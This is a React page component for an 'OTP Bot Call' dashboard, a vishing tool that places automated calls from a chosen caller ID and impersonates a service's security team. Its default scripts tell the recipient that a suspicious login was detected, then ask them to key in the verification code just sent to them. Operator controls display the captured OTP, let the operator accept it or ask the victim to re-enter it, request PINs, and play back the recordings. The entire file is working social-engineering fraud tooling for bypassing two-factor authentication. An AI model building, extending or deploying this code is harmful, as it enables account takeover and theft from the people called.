import React, { useState, useEffect, useRef } from 'react';
import { io } from 'socket.io-client';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Textarea } from '../components/ui/textarea';
import { Badge } from '../components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '../components/ui/tabs';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
import { ScrollArea } from '../components/ui/scroll-area';
import { 
    Phone, 
    PhoneCall,
    PhoneOff,
    CheckCircle2,
    XCircle,
    Play,
    Pause,
    Copy,
    Download,
    Settings,
    Terminal,
    User,
    Shield,
    Hash,
    Volume2,
    Send,
    TrendingUp,
    Clock,
    Mail,
    Key
} from 'lucide-react';
import { toast } from 'sonner';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const VOICE_MODELS = [
    { value: 'Joanna', label: 'Joanna (US English Female)' },
    { value: 'Matthew', label: 'Matthew (US English Male)' },
    { value: 'Amy', label: 'Amy (UK English Female)' },
    { value: 'Brian', label: 'Brian (UK English Male)' },
];

const CALL_TYPES = [
    { value: 'password_change', label: 'Password Change Alert' },
    { value: 'login_verification', label: 'Login Verification' },
    { value: 'account_security', label: 'Account Security' },
    { value: 'transaction_alert', label: 'Transaction Alert' },
];

const OTPBotPage = () => {
    const [socket, setSocket] = useState(null);
    const [logs, setLogs] = useState([]);
    const [sessionId, setSessionId] = useState(null);
    const [callId, setCallId] = useState(null);
    const [sessionStatus, setSessionStatus] = useState(null);
    const [otpReceived, setOtpReceived] = useState(null);
    const [amdResult, setAmdResult] = useState(null);
    const [callDuration, setCallDuration] = useState(0);
    const [recordingUrl, setRecordingUrl] = useState(null);
    const [isPlaying, setIsPlaying] = useState(false);
    const [isCallActive, setIsCallActive] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [currentStep, setCurrentStep] = useState(0);
    const logsEndRef = useRef(null);
    const audioRef = useRef(null);
    const durationInterval = useRef(null);

    // Form state
    const [config, setConfig] = useState({
        recipient_number: '',
        caller_id: '',
        recipient_name: '',
        service_name: 'Account',
        otp_digits: 6,
        language: 'en',
        voice_name: 'Joanna',
        step1_message: 'Hello {name}, we have detected a login attempt to your {service} account from a new device. If you did not recognize this request, please press 1. If this was you, press 0.',
        step2_message: 'Alright, we just sent a {digits} digit verification code to your number. Could you please enter it using your dial pad?',
        step3_message: 'Okay, please wait a moment while we verify the code.',
        accepted_message: 'Okay! We have declined the sign-in request, and your account is safe. Thank you for your time. Have a nice day!',
        rejected_message: 'I am sorry, but the code you entered is incorrect. Could you please enter it again? It should be {digits} digits.'
    });

    const [activeStep, setActiveStep] = useState('step1');

    // Scroll to bottom on new logs
    useEffect(() => {
        logsEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [logs]);

    // Duration counter
    useEffect(() => {
        if (isCallActive) {
            durationInterval.current = setInterval(() => {
                setCallDuration(prev => prev + 1);
            }, 1000);
        } else {
            if (durationInterval.current) {
                clearInterval(durationInterval.current);
            }
        }
        return () => {
            if (durationInterval.current) {
                clearInterval(durationInterval.current);
            }
        };
    }, [isCallActive]);

    // Connect to Socket.IO when session starts
    useEffect(() => {
        if (sessionId && !socket) {
            console.log('Connecting to Socket.IO at:', BACKEND_URL);
            const newSocket = io(BACKEND_URL, {
                transports: ['websocket', 'polling'],
                path: '/api/socket.io/',
                reconnection: true,
                reconnectionAttempts: 5,
                reconnectionDelay: 1000,
            });

            newSocket.on('connect', () => {
                console.log('Socket connected, sid:', newSocket.id);
                newSocket.emit('join_session', { session_id: sessionId });
            });

            newSocket.on('connect_error', (error) => {
                console.error('Socket connection error:', error);
            });

            newSocket.on('call_log', (log) => {
                console.log('Log received:', log);
                setLogs(prev => [...prev, log]);
                
                // Handle OTP captured
                if (log.type === 'otp' && log.data?.otp) {
                    setOtpReceived(log.data.otp);
                    setSessionStatus('OTP Captured');
                }
                
                // Handle AMD detection
                if (log.type === 'amd' && log.data?.result) {
                    setAmdResult(log.data.result);
                }
                
                // Handle recording URL
                if (log.type === 'recording' && log.data?.fileId) {
                    // Use our proxy endpoint to download the recording
                    const recordingDownloadUrl = `${API}/otp/recording/download/${log.data.fileId}`;
                    setRecordingUrl(recordingDownloadUrl);
                } else if (log.type === 'recording' && log.data?.url) {
                    setRecordingUrl(log.data.url);
                }
                
                // Handle call completed
                if (log.type === 'info' && log.message.includes('Call ended')) {
                    setIsCallActive(false);
                    setSessionStatus('Completed');
                }
                
                // Update status based on log type
                if (log.type === 'ringing') setSessionStatus('Ringing');
                if (log.type === 'answered') setSessionStatus('Answered');
                if (log.type === 'busy') setSessionStatus('Busy');
                if (log.type === 'no_answer') setSessionStatus('No Answer');
                if (log.type === 'rejected') setSessionStatus('Rejected');
            });

            newSocket.on('disconnect', () => {
                console.log('Socket disconnected');
            });

            setSocket(newSocket);

            return () => {
                newSocket.close();
            };
        }
    }, [sessionId]);

    const getAuthHeaders = () => {
        const token = localStorage.getItem('token');
        return token ? { Authorization: `Bearer ${token}` } : {};
    };

    const handleInitiateCall = async () => {
        if (!config.recipient_number || !config.caller_id) {
            toast.error('Harap isi nomor penerima dan Caller ID');
            return;
        }

        setIsLoading(true);
        setLogs([]);
        setOtpReceived(null);
        setAmdResult(null);
        setCallDuration(0);
        setRecordingUrl(null);
        setCurrentStep(1);
        setSessionStatus('Initiating');

        try {
            const response = await axios.post(`${API}/otp/initiate-call`, config, {
                headers: getAuthHeaders()
            });

            setSessionId(response.data.session_id);
            setCallId(response.data.call_id);
            setIsCallActive(true);
            setSessionStatus('Calling');
            toast.success('Call initiated!');
        } catch (error) {
            console.error('Error initiating call:', error);
            toast.error(error.response?.data?.detail || 'Failed to initiate call');
            setCurrentStep(0);
            setSessionStatus(null);
        } finally {
            setIsLoading(false);
        }
    };

    const handleAccept = async () => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/accept/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.success('OTP Accepted - Call completed!');
            setIsCallActive(false);
            setSessionStatus('Completed');
        } catch (error) {
            toast.error('Failed to accept');
        } finally {
            setIsLoading(false);
        }
    };

    const handleReject = async () => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/reject/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.info('OTP Rejected - Retry message sent');
            setOtpReceived(null);
            setSessionStatus('Waiting OTP');
        } catch (error) {
            toast.error('Failed to reject');
        } finally {
            setIsLoading(false);
        }
    };

    const handleRequestPin = async (digits) => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/request-pin/${sessionId}?digits=${digits}`, {}, {
                headers: getAuthHeaders()
            });
            toast.info(`Requesting ${digits}-digit PIN`);
        } catch (error) {
            toast.error('Failed to request PIN');
        } finally {
            setIsLoading(false);
        }
    };

    const handleHangup = async () => {
        if (!sessionId) return;
        setIsLoading(true);

        try {
            await axios.post(`${API}/otp/hangup/${sessionId}`, {}, {
                headers: getAuthHeaders()
            });
            toast.info('Call ended');
            setIsCallActive(false);
            setSessionStatus('Ended');
        } catch (error) {
            toast.error('Failed to hangup');
        } finally {
            setIsLoading(false);
        }
    };

    const copyLogs = () => {
        const logText = logs.map(l => `[${l.timestamp}] ${l.message}`).join('\n');
        navigator.clipboard.writeText(logText);
        toast.success('Logs copied!');
    };

    const exportLogs = () => {
        const logText = logs.map(l => `[${l.timestamp}] ${l.type.toUpperCase()}: ${l.message}`).join('\n');
        const blob = new Blob([logText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `call_log_${sessionId || 'session'}.txt`;
        a.click();
    };

    const toggleRecording = () => {
        if (audioRef.current) {
            if (isPlaying) {
                audioRef.current.pause();
            } else {
                audioRef.current.play();
            }
            setIsPlaying(!isPlaying);
        }
    };

    const formatDuration = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}m ${secs}s`;
    };

    const getLogIcon = (type) => {
        switch (type) {
            case 'ringing': return '📞';
            case 'answered': return '🤳';
            case 'amd': return '👤';
            case 'human': return '👤';
            case 'silent': return '🔇';
            case 'voicemail': return '🤖';
            case 'busy': return '📵';
            case 'no_answer': return '📵';
            case 'rejected': return '📴';
            case 'success': return '✅';
            case 'error': return '❌';
            case 'dtmf': return '🔢';
            case 'otp': return '🔑';
            case 'call': return '📞';
            case 'step': return '🎙️';
            case 'action': return '⚡';
            case 'warning': return '⚠️';
            case 'info': return 'ℹ️';
            case 'recording': return '🎤';
            default: return '📋';
        }
    };

    const getLogColor = (type) => {
        switch (type) {
            case 'success': 
            case 'answered':
            case 'human':
                return 'text-emerald-400';
            case 'error': 
            case 'rejected':
            case 'busy':
                return 'text-red-400';
            case 'ringing':
                return 'text-blue-400';
            case 'dtmf': 
            case 'otp':
                return 'text-amber-400';
            case 'amd':
            case 'warning':
                return 'text-yellow-400';
            case 'voicemail':
                return 'text-purple-400';
            case 'recording':
                return 'text-pink-400';
            default: return 'text-gray-300';
        }
    };

    const getStatusBadge = () => {
        if (!sessionStatus) return null;
        
        const statusColors = {
            'Initiating': 'bg-blue-500/20 text-blue-400',
            'Calling': 'bg-blue-500/20 text-blue-400 animate-pulse',
            'Ringing': 'bg-yellow-500/20 text-yellow-400 animate-pulse',
            'Answered': 'bg-emerald-500/20 text-emerald-400',
            'OTP Captured': 'bg-amber-500/20 text-amber-400',
            'Completed': 'bg-emerald-500/20 text-emerald-400',
            'Busy': 'bg-red-500/20 text-red-400',
            'No Answer': 'bg-red-500/20 text-red-400',
            'Rejected': 'bg-red-500/20 text-red-400',
            'Ended': 'bg-gray-500/20 text-gray-400',
        };

        return (
            <Badge className={statusColors[sessionStatus] || 'bg-gray-500/20 text-gray-400'}>
                🔑 {sessionStatus}
            </Badge>
        );
    };

    return (
        <div className="space-y-6" data-testid="otp-bot-page">
            {/* Header */}
            <div className="flex items-center justify-between">
                <div>
                    <h1 className="text-2xl md:text-3xl font-black tracking-tight flex items-center gap-3">
                        <PhoneCall className="w-8 h-8 text-violet-400" />
                        <span>OTP <span className="text-gradient">Bot Call</span></span>
                    </h1>
                    <p className="text-gray-400 mt-1">Advanced Voice OTP Collection System</p>
                </div>
                <div className="flex items-center gap-3">
                    <Badge className={`${isCallActive ? 'bg-emerald-500/20 text-emerald-400 animate-pulse' : 'bg-gray-500/20 text-gray-400'}`}>
                        {isCallActive ? '● Active Call' : '○ No Active Call'}
                    </Badge>
                </div>
            </div>

            <div className="grid lg:grid-cols-2 gap-6">
                {/* Left Column - Configuration */}
                <div className="space-y-6">
                    {/* Call Configuration Card */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-4">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Settings className="w-5 h-5 text-violet-400" />
                                Call Configuration
                            </CardTitle>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="text-xs uppercase tracking-wider text-gray-500">Call Type</Label>
                                    <Select defaultValue="password_change">
                                        <SelectTrigger className="bg-[#0F111A] border-white/10">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent className="bg-[#12141F] border-white/10">
                                            {CALL_TYPES.map(type => (
                                                <SelectItem key={type.value} value={type.value}>{type.label}</SelectItem>
                                            ))}
                                        </SelectContent>
                                    </Select>
                                </div>
                                <div className="space-y-2">
                                    <Label className="text-xs uppercase tracking-wider text-gray-500">Voice Model</Label>
                                    <Select 
                                        value={config.voice_name}
                                        onValueChange={(v) => setConfig({...config, voice_name: v})}
                                    >
                                        <SelectTrigger className="bg-[#0F111A] border-white/10">
                                            <SelectValue />
                                        </SelectTrigger>
                                        <SelectContent className="bg-[#12141F] border-white/10">
                                            {VOICE_MODELS.map(model => (
                                                <SelectItem key={model.value} value={model.value}>{model.label}</SelectItem>
                                            ))}
                                        </SelectContent>
                                    </Select>
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Phone className="w-3 h-3" />
                                        Caller ID / From Number
                                    </Label>
                                    <Input
                                        data-testid="otp-caller-id"
                                        value={config.caller_id}
                                        onChange={(e) => setConfig({...config, caller_id: e.target.value})}
                                        placeholder="+12025551234"
                                        className="bg-[#0F111A] border-amber-500/30 font-mono"
                                        disabled={isCallActive}
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <User className="w-3 h-3" />
                                        Recipient Name
                                    </Label>
                                    <Input
                                        value={config.recipient_name}
                                        onChange={(e) => setConfig({...config, recipient_name: e.target.value})}
                                        placeholder="John"
                                        className="bg-[#0F111A] border-white/10"
                                        disabled={isCallActive}
                                    />
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Phone className="w-3 h-3" />
                                        Recipient Number
                                    </Label>
                                    <Input
                                        data-testid="otp-recipient-number"
                                        value={config.recipient_number}
                                        onChange={(e) => setConfig({...config, recipient_number: e.target.value})}
                                        placeholder="+13362873517"
                                        className="bg-[#0F111A] border-white/10 font-mono"
                                        disabled={isCallActive}
                                    />
                                </div>
                                <div className="space-y-2">
                                    <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                        <Shield className="w-3 h-3" />
                                        Service Name
                                    </Label>
                                    <Input
                                        value={config.service_name}
                                        onChange={(e) => setConfig({...config, service_name: e.target.value})}
                                        placeholder="Account"
                                        className="bg-[#0F111A] border-white/10"
                                        disabled={isCallActive}
                                    />
                                </div>
                            </div>

                            <div className="space-y-2">
                                <Label className="flex items-center gap-2 text-xs uppercase tracking-wider text-gray-500">
                                    <Hash className="w-3 h-3" />
                                    OTP Digits
                                </Label>
                                <Select 
                                    value={config.otp_digits.toString()}
                                    onValueChange={(v) => setConfig({...config, otp_digits: parseInt(v)})}
                                    disabled={isCallActive}
                                >
                                    <SelectTrigger className="bg-[#0F111A] border-white/10 w-32">
                                        <SelectValue />
                                    </SelectTrigger>
                                    <SelectContent className="bg-[#12141F] border-white/10">
                                        <SelectItem value="4">4 digits</SelectItem>
                                        <SelectItem value="5">5 digits</SelectItem>
                                        <SelectItem value="6">6 digits</SelectItem>
                                        <SelectItem value="8">8 digits</SelectItem>
                                    </SelectContent>
                                </Select>
                            </div>

                            {/* Action Button */}
                            <div className="pt-4">
                                <Button
                                    onClick={handleInitiateCall}
                                    disabled={isLoading || isCallActive}
                                    data-testid="initiate-call-btn"
                                    className="w-full bg-violet-600 hover:bg-violet-700 glow-primary"
                                >
                                    {isLoading ? (
                                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mr-2" />
                                    ) : (
                                        <Play className="w-4 h-4 mr-2" />
                                    )}
                                    {isCallActive ? 'Call in Progress' : 'Start Call'}
                                </Button>
                            </div>
                        </CardContent>
                    </Card>

                    {/* Call Steps Configuration */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Volume2 className="w-5 h-5 text-cyan-400" />
                                Call Steps Configuration
                            </CardTitle>
                        </CardHeader>
                        <CardContent>
                            <Tabs value={activeStep} onValueChange={setActiveStep}>
                                <TabsList className="grid grid-cols-5 bg-[#0F111A] mb-4">
                                    <TabsTrigger value="step1" className="text-xs data-[state=active]:bg-blue-600">Step 1</TabsTrigger>
                                    <TabsTrigger value="step2" className="text-xs data-[state=active]:bg-blue-600">Step 2</TabsTrigger>
                                    <TabsTrigger value="step3" className="text-xs data-[state=active]:bg-blue-600">Step 3</TabsTrigger>
                                    <TabsTrigger value="accepted" className="text-xs data-[state=active]:bg-emerald-600">Accepted</TabsTrigger>
                                    <TabsTrigger value="rejected" className="text-xs data-[state=active]:bg-red-600">Rejected</TabsTrigger>
                                </TabsList>

                                <TabsContent value="step1" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 1 - Greeting & Initial Verification</p>
                                    <Textarea
                                        value={config.step1_message}
                                        onChange={(e) => setConfig({...config, step1_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="step2" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 2 - OTP Request</p>
                                    <Textarea
                                        value={config.step2_message}
                                        onChange={(e) => setConfig({...config, step2_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="step3" className="space-y-2">
                                    <p className="text-xs text-cyan-400">Step 3 - Verification Wait</p>
                                    <Textarea
                                        value={config.step3_message}
                                        onChange={(e) => setConfig({...config, step3_message: e.target.value})}
                                        className="bg-[#0F111A] border-white/10 min-h-[80px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="accepted" className="space-y-2">
                                    <p className="text-xs text-emerald-400">Accepted Message</p>
                                    <Textarea
                                        value={config.accepted_message}
                                        onChange={(e) => setConfig({...config, accepted_message: e.target.value})}
                                        className="bg-[#0F111A] border-emerald-500/30 min-h-[80px] text-sm"
                                    />
                                </TabsContent>

                                <TabsContent value="rejected" className="space-y-2">
                                    <p className="text-xs text-red-400">Rejected Message</p>
                                    <Textarea
                                        value={config.rejected_message}
                                        onChange={(e) => setConfig({...config, rejected_message: e.target.value})}
                                        className="bg-[#0F111A] border-red-500/30 min-h-[80px] text-sm"
                                    />
                                </TabsContent>
                            </Tabs>
                        </CardContent>
                    </Card>
                </div>

                {/* Right Column - Current Call Status & Logs */}
                <div className="space-y-6">
                    {/* Current Call Status Card */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2">
                            <div className="flex items-center justify-between">
                                <CardTitle className="text-lg flex items-center gap-2">
                                    <TrendingUp className="w-5 h-5 text-emerald-400" />
                                    Current Call Status
                                </CardTitle>
                                {isCallActive && (
                                    <div className="flex gap-2 flex-wrap">
                                        <Button
                                            onClick={handleAccept}
                                            disabled={isLoading || !otpReceived}
                                            size="sm"
                                            className="bg-emerald-600 hover:bg-emerald-700"
                                        >
                                            <CheckCircle2 className="w-3 h-3 mr-1" />
                                            Accept OTP
                                        </Button>
                                        <Button
                                            onClick={handleReject}
                                            disabled={isLoading || !otpReceived}
                                            size="sm"
                                            variant="destructive"
                                        >
                                            <XCircle className="w-3 h-3 mr-1" />
                                            Deny OTP
                                        </Button>
                                        <Button
                                            onClick={() => handleRequestPin(4)}
                                            disabled={isLoading}
                                            size="sm"
                                            className="bg-amber-600 hover:bg-amber-700"
                                        >
                                            <Key className="w-3 h-3 mr-1" />
                                            PIN 4
                                        </Button>
                                        <Button
                                            onClick={() => handleRequestPin(6)}
                                            disabled={isLoading}
                                            size="sm"
                                            className="bg-amber-600 hover:bg-amber-700"
                                        >
                                            <Key className="w-3 h-3 mr-1" />
                                            PIN 6
                                        </Button>
                                    </div>
                                )}
                            </div>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            {!isCallActive && !sessionId ? (
                                <div className="text-center py-8 text-gray-500">
                                    <PhoneCall className="w-12 h-12 mx-auto opacity-30 mb-3" />
                                    <p>No active call</p>
                                    <p className="text-sm">Start a call to begin</p>
                                </div>
                            ) : (
                                <div className="space-y-3">
                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Call ID</p>
                                            <p className="font-mono text-sm text-gray-300 truncate">
                                                {callId || '-'}
                                            </p>
                                        </div>
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Status</p>
                                            {getStatusBadge()}
                                        </div>
                                    </div>

                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Captured OTP</p>
                                            <p className="font-mono text-2xl font-bold text-amber-400">
                                                {otpReceived || '-'}
                                            </p>
                                        </div>
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Duration</p>
                                            <p className="font-mono text-lg text-gray-300 flex items-center gap-2">
                                                <Clock className="w-4 h-4" />
                                                {formatDuration(callDuration)}
                                            </p>
                                        </div>
                                    </div>

                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">AMD Result</p>
                                            <Badge className={`${
                                                amdResult === 'HUMAN' ? 'bg-emerald-500/20 text-emerald-400' :
                                                amdResult === 'VOICEMAIL' ? 'bg-purple-500/20 text-purple-400' :
                                                'bg-gray-500/20 text-gray-400'
                                            }`}>
                                                {amdResult || 'Detecting...'}
                                            </Badge>
                                        </div>
                                        <div className="space-y-1">
                                            <p className="text-xs text-gray-500 uppercase">Recording</p>
                                            {recordingUrl ? (
                                                <div className="flex items-center gap-2">
                                                    <Button 
                                                        size="sm" 
                                                        variant="outline"
                                                        onClick={async () => {
                                                            try {
                                                                const token = localStorage.getItem('token');
                                                                const response = await fetch(recordingUrl, {
                                                                    headers: { Authorization: `Bearer ${token}` }
                                                                });
                                                                const blob = await response.blob();
                                                                const url = URL.createObjectURL(blob);
                                                                
                                                                if (audioRef.current) {
                                                                    audioRef.current.src = url;
                                                                    if (isPlaying) {
                                                                        audioRef.current.pause();
                                                                        setIsPlaying(false);
                                                                    } else {
                                                                        audioRef.current.play();
                                                                        setIsPlaying(true);
                                                                    }
                                                                }
                                                            } catch (error) {
                                                                console.error('Error playing recording:', error);
                                                                toast.error('Failed to play recording');
                                                            }
                                                        }}
                                                        className="text-pink-400 border-pink-500/30"
                                                    >
                                                        {isPlaying ? <Pause className="w-3 h-3 mr-1" /> : <Play className="w-3 h-3 mr-1" />}
                                                        {isPlaying ? 'Pause' : 'Play'}
                                                    </Button>
                                                    <Button 
                                                        size="sm" 
                                                        variant="outline"
                                                        onClick={async () => {
                                                            try {
                                                                const token = localStorage.getItem('token');
                                                                const response = await fetch(recordingUrl, {
                                                                    headers: { Authorization: `Bearer ${token}` }
                                                                });
                                                                const blob = await response.blob();
                                                                const url = URL.createObjectURL(blob);
                                                                const a = document.createElement('a');
                                                                a.href = url;
                                                                a.download = `recording_${callId}.wav`;
                                                                a.click();
                                                            } catch (error) {
                                                                console.error('Error downloading recording:', error);
                                                                toast.error('Failed to download recording');
                                                            }
                                                        }}
                                                        className="text-cyan-400 border-cyan-500/30"
                                                    >
                                                        <Download className="w-3 h-3 mr-1" />
                                                        Download
                                                    </Button>
                                                    <audio ref={audioRef} onEnded={() => setIsPlaying(false)} />
                                                </div>
                                            ) : (
                                                <p className="text-sm text-gray-500">Not available</p>
                                            )}
                                        </div>
                                    </div>

                                    {isCallActive && (
                                        <div className="pt-2">
                                            <Button
                                                onClick={handleHangup}
                                                disabled={isLoading}
                                                variant="destructive"
                                                className="w-full"
                                            >
                                                <PhoneOff className="w-4 h-4 mr-2" />
                                                End Call
                                            </Button>
                                        </div>
                                    )}
                                </div>
                            )}
                        </CardContent>
                    </Card>

                    {/* Live Call Log */}
                    <Card className="bg-[#12141F] border-white/5">
                        <CardHeader className="pb-2 flex flex-row items-center justify-between">
                            <CardTitle className="text-lg flex items-center gap-2">
                                <Terminal className="w-5 h-5 text-emerald-400" />
                                Live Call Log
                            </CardTitle>
                            <div className="flex gap-2">
                                <Button variant="outline" size="sm" onClick={copyLogs} className="text-gray-400 hover:text-white border-white/10">
                                    <Copy className="w-4 h-4 mr-1" />
                                    Copy
                                </Button>
                                <Button variant="outline" size="sm" onClick={exportLogs} className="text-gray-400 hover:text-white border-white/10">
                                    <Download className="w-4 h-4 mr-1" />
                                    Export
                                </Button>
                            </div>
                        </CardHeader>
                        <CardContent>
                            <ScrollArea className="h-[350px] pr-4">
                                <div className="space-y-2 font-mono text-sm">
                                    {logs.length === 0 ? (
                                        <p className="text-gray-500 text-center py-8">Waiting for call activity...</p>
                                    ) : (
                                        logs.map((log, index) => (
                                            <div 
                                                key={index} 
                                                className={`flex gap-2 ${getLogColor(log.type)}`}
                                            >
                                                <span className="text-gray-500">[{log.timestamp}]</span>
                                                <span>{getLogIcon(log.type)}</span>
                                                <span>{log.message}</span>
                                            </div>
                                        ))
                                    )}
                                    <div ref={logsEndRef} />
                                </div>
                            </ScrollArea>
                            {sessionId && (
                                <p className="text-xs text-gray-500 mt-4 font-mono">
                                    Session: {sessionId.substring(0, 8)}...
                                </p>
                            )}
                        </CardContent>
                    </Card>
                </div>
            </div>
        </div>
    );
};

export default OTPBotPage;
